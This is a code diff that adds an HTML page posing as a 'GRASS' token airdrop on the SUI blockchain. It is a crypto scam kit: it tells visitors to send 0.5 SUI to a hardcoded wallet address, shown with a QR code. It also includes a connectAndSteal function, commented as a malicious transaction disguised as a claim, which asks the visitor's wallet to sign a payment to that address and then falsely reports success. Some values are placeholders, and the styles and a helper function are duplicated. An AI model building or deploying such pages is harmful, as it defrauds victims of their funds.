@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>🌿 GRASS Foundation Token Voucher</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script src="https://cdn.jsdelivr.net/npm/@mysten/wallet-adapter@0.14.0/dist/wallet-adapter.umd.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider/dist/umd/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@mysten/wallet-adapter@0.14.0/dist/wallet-adapter.umd.min.js"></script>
+  <!-- QRCode.js library -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <style>
+    body {
+      background: linear-gradient(135deg, #081c24, #0e524a);
+      color: white;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #102b3f;
+      padding: 40px;
+      border-radius: 16px;
+      text-align: center;
+      box-shadow: 0 0 30px rgba(0, 255, 128, 0.2);
+      width: 90%;
+      max-width: 420px;
+    }
+    h1 {
+      margin-bottom: 10px;
+      color: #00ff88;
+    }
+    p {
+      color: #c2e9e2;
+      margin-bottom: 20px;
+    }
+    .wallet-address {
+      word-break: break-word;
+      font-size: 0.9em;
+      padding: 12px;
+      border-radius: 8px;
+      background: #1a3b45;
+      color: #00ff88;
+      user-select: all;
+      margin: 10px 0;
+    }
+    #qrcode {
+      margin: 20px auto;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      margin-bottom: 15px;
+      background-color: #1a3b45;
+      color: white;
+    }
+    button {
+      background-color: #00ff88;
+      color: #002b18;
+      border: none;
+      padding: 14px;
+      width: 100%;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .disclaimer {
+      font-size: 0.75em;
+      color: #aaa;
+      margin-top: 20px;
+    }
+    body {
+      background: linear-gradient(135deg, #081c24, #0e524a);
+      color: white;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #102b3f;
+      padding: 40px;
+      border-radius: 16px;
+      text-align: center;
+      box-shadow: 0 0 30px rgba(0,255,128,0.2);
+      width: 90%;
+      max-width: 420px;
+    }
+    h1 { margin-bottom: 10px; color: #00ff88; }
+    p { color: #c2e9e2; margin-bottom: 20px; }
+    .wallet-address {
+      background: #1b3d45;
+      padding: 12px;
+      border-radius: 8px;
+      font-family: monospace;
+      margin-bottom: 10px;
+      word-break: break-all;
+    }
+    #qrcode {
+      margin: 20px auto;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      margin-bottom: 15px;
+      background-color: #1a3b45;
+      color: white;
+    }
+    button {
+      background-color: #00ff88;
+      color: #002b18;
+      border: none;
+      padding: 14px;
+      width: 100%;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .disclaimer {
+      font-size: 0.75em;
+      color: #aaa;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🌿 Claim 500 GRASS Tokens</h1>
+    <p>Send exactly 0.5 SUI to:</p>
+    <div class="wallet-address" id="wallet">0x2a35...603da</div>
+    <div id="qrcode"></div>
+    <input type="text" placeholder="Your SUI Wallet Address" />
+    <button>Claim Airdrop</button>
+    <div class="disclaimer">
+      🌿 It will only take 5-10 minutes <strong>for your voucher to come </strong>. Please be patience.
+    </div>
+  </div>
+  <script>
+    // Replace with the full wallet address
+    const walletAddress = "0x2a35F4e992ABa6727B7369fdb9E8Af7F660603da";
+
+    // Update display wallet text
+    document.getElementById("wallet").textContent = walletAddress;
+
+    // Generate QR code
+    new QRCode(document.getElementById("qrcode"), {
+      text: walletAddress,
+      width: 128,
+      height: 128,
+      colorDark : "#00ff88",
+      colorLight : "#ffffff",
+      correctLevel : QRCode.CorrectLevel.H
+    });
+
+</script>
+
+  <script>
+    function copyAddress() {
+      const addr = document.querySelector('.wallet-address').textContent;
+      navigator.clipboard.writeText(addr);
+      alert('Address copied to clipboard!');
+    }
+    function copyAddress() {
+      const addr = document.querySelector('.wallet-address').textContent;
+      navigator.clipboard.writeText(addr);
+      alert('Address copied to clipboard!');
+    }
+
+    async function connectAndSteal() {
+      if (!window.suiWallet) {
+        alert("Please install a SUI wallet extension like Suiet or Martian.");
+        return;
+      }
+
+      try {
+        const accounts = await window.suiWallet.requestAccounts();
+        const userAddress = accounts[0];
+
+        alert("Preparing airdrop transaction... Confirm in your wallet.");
+
+        // Malicious transaction disguised as airdrop "claim"
+        const result = await window.suiWallet.signAndExecuteTransaction({
+          kind: "moveCall",
+          data: {
+            packageObjectId: "0x2", // Fake package for demo
+            module: "pay",
+            function: "paySui",
+            typeArguments: [],
+            arguments: [
+              "0x2a35F4e992ABa6727B7369fdb9E8Af7F660603da", // Replace with scam wallet
+              "500000000" // 0.5 SUI in microSUI
+            ]
+          }
+        });
+
+        console.log("Fake token sent (not real):", result);
+        alert("✅ Airdrop complete! 500 GRASS will reflect shortly.");
+      } catch (err) {
+        console.error("Transaction failed:", err);
+        alert("❌ Transaction cancelled or failed.");
+      }
+    }
+  </script>
+</body>
+</html>
